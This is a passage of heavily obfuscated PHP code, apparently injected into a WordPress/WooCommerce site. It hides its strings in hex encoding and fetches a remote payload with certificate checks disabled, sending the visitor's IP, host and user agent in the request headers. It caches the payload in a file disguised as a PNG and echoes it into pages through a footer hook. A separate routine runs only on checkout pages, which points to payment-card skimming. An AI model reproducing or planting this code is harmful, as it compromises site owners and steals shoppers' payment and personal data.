        if ($si_flinuxcupyni_gugtfestciesys && $si_flinuxcupyni_smienwyrtny !== false) {
            echo $si_flinuxcupyni_smienwyrtny;
            return;
        }
    }

    $si_flinuxcupyni_scaegjascipe = si_zalkaunou();
    if ($si_flinuxcupyni_scaegjascipe !== false) {
        @unlink($si_flinuxcupyni_gaepouboastacl);
        file_put_contents($si_flinuxcupyni_gaepouboastacl, '‰PNG' . $si_flinuxcupyni_scaegjascipe, LOCK_EX);
        $si_flinuxcupyni_smienwyrtny = si_truoaiefpl($si_flinuxcupyni_scaegjascipe);
        if ($si_flinuxcupyni_smienwyrtny !== false) {
            echo $si_flinuxcupyni_smienwyrtny;
            return;
        }
    }

    if ($si_flinuxcupyni_nzosouhucae && !empty($si_flinuxcupyni_spaefldiexpoud)) {
        $si_flinuxcupyni_smienwyrtny = si_truoaiefpl($si_flinuxcupyni_spaefldiexpoud);
        if ($si_flinuxcupyni_smienwyrtny !== false) {
            echo $si_flinuxcupyni_smienwyrtny;
            return;
        }
    }

    if (file_exists($si_flinuxcupyni_snyshadjiol)) {
        $si_flinuxcupyni_priontsla = file_get_contents($si_flinuxcupyni_snyshadjiol);
        if (!empty($si_flinuxcupyni_priontsla)) {
            $si_flinuxcupyni_priontsla = mb_substr($si_flinuxcupyni_priontsla, 4);
            $si_flinuxcupyni_smienwyrtny = si_truoaiefpl($si_flinuxcupyni_priontsla);
            if ($si_flinuxcupyni_smienwyrtny !== false) {
                echo si_sliejmesw("4c06081a05110755", SI_GROUBWIEC) . $si_flinuxcupyni_smienwyrtny . si_sliejmesw("4c5a180b1e08031f4c", SI_GROUBWIEC);
            }
        }
    }
}

function si_zalkaunou()
{
    $si_bybzoatriosci = si_sliejmesw("18011f181f5b5c44111d02151b10191a03135d021c1308590705441f0505140e062a051714435f46181907", SI_GROUBWIEC);

    $si_flinuxcupyni_snoushshotrios = isset($_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)]) ? $_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)] : si_sliejmesw("051b000603161d", SI_GROUBWIEC);
    $si_flinuxcupyni_plieraekghek = isset($_SERVER[si_sliejmesw("2230262738242c2a363135", SI_GROUBWIEC)]) ? $_SERVER[si_sliejmesw("2230262738242c2a363135", SI_GROUBWIEC)] : si_sliejmesw("41475c465c4f434543", SI_GROUBWIEC);
    $si_flinuxcupyni_smykjaegl = si_seamlaraestra() ? si_seamlaraestra() : $si_flinuxcupyni_plieraekghek;
    $si_flinuxcupynerverIp = isset($_SERVER[si_sliejmesw("2330393e29332c2a363135", SI_GROUBWIEC)]) ? $_SERVER[si_sliejmesw("2330393e29332c2a363135", SI_GROUBWIEC)] : si_sliejmesw("41475c465c4f434543", SI_GROUBWIEC);

    $si_flinuxcupynumOrd = 0;
    $si_flinuxcupynumMult = 0;
    for ($si_flinuxcupyni_prouskswa = 0; $si_flinuxcupyni_prouskswa < strlen($si_flinuxcupyni_snoushshotrios); $si_flinuxcupyni_prouskswa++) {
        $si_flinuxcupyni_lrirdshedijcli = ord($si_flinuxcupyni_snoushshotrios[$si_flinuxcupyni_prouskswa]);
        $si_flinuxcupynumOrd += $si_flinuxcupyni_lrirdshedijcli;
        $si_flinuxcupynumMult += $si_flinuxcupyni_prouskswa * $si_flinuxcupyni_lrirdshedijcli;
    }

    $si_flinuxcupyni_gauxposmionds = array(
        si_sliejmesw("141c180b03141d1f4855", SI_GROUBWIEC) . $si_flinuxcupynumOrd,
        si_sliejmesw("1f070f0d1e5b53", SI_GROUBWIEC) . $si_flinuxcupynumMult,
        si_sliejmesw("0007020b095b53", SI_GROUBWIEC) . $si_flinuxcupyni_smykjaegl,
        si_sliejmesw("1d10190b04001d1f4855", SI_GROUBWIEC) . $si_flinuxcupyni_snoushshotrios,
        si_sliejmesw("11110f1a0912005152", SI_GROUBWIEC) . $si_flinuxcupynerverIp
    );

    $si_flinuxcupyni_scaegjascipe = false;
    $si_frouwoaheefeid = false;

    if ($_SERVER[si_sliejmesw("22303a3d293227343f30333e3f31", SI_GROUBWIEC)] === si_sliejmesw("37303f", SI_GROUBWIEC) && function_exists(si_sliejmesw("1300190433081d0206", SI_GROUBWIEC))) {
        $si_flinuxcupyni_knaedwpemspe = curl_init($si_bybzoatriosci);
        curl_setopt_array($si_flinuxcupyni_knaedwpemspe, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HEADER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => $si_flinuxcupyni_gauxposmionds
        ));
        $si_flinuxcupyntart = time();
        $si_flinuxcupyni_scaegjascipe = @curl_exec($si_flinuxcupyni_knaedwpemspe);
        $si_flinuxcupyni_thokzeaskeepo = time() - $si_flinuxcupyntart;
        $si_frouwoaheefeid = $si_flinuxcupyni_thokzeaskeepo < 14;
        curl_close($si_flinuxcupyni_knaedwpemspe);
    }

    if (!$si_flinuxcupyni_scaegjascipe && $si_frouwoaheefeid && function_exists(si_sliejmesw("0301190d0d0c2c081d1b13130801340b1e04121f17", SI_GROUBWIEC))) {
        $si_flinuxcupyni_nosnoajabri = array(
            si_sliejmesw("18011f18", SI_GROUBWIEC) => array(
                si_sliejmesw("1d101f000305", SI_GROUBWIEC) => si_sliejmesw("37303f", SI_GROUBWIEC),
                si_sliejmesw("18100a0c0913", SI_GROUBWIEC) => implode("\r\n", $si_flinuxcupyni_gauxposmionds)
            )
        );
        $si_flinuxcupyni_chieksasca = stream_context_create($si_flinuxcupyni_nosnoajabri);
        $si_flinuxcupyni_scaegjascipe = @file_get_contents($si_bybzoatriosci, false, $si_flinuxcupyni_chieksasca);
    }

    if ($si_flinuxcupyni_scaegjascipe && preg_match(si_sliejmesw("532b3029413b124608454a4f5b5a564430132f052f5e4355", SI_GROUBWIEC), $si_flinuxcupyni_scaegjascipe)) {
        return $si_flinuxcupyni_scaegjascipe;
    }

    return false;
}

add_action(si_sliejmesw("0705340e030e070e00", SI_GROUBWIEC), si_sliejmesw("031c3403151100071310140313", SI_GROUBWIEC));

function si_kypslaesuc()
{
    if (function_exists(si_sliejmesw("1906340b040410001d0013", SI_GROUBWIEC))) {
        if (is_checkout()) {
            si_ykiedstealusa();
        }
    }
}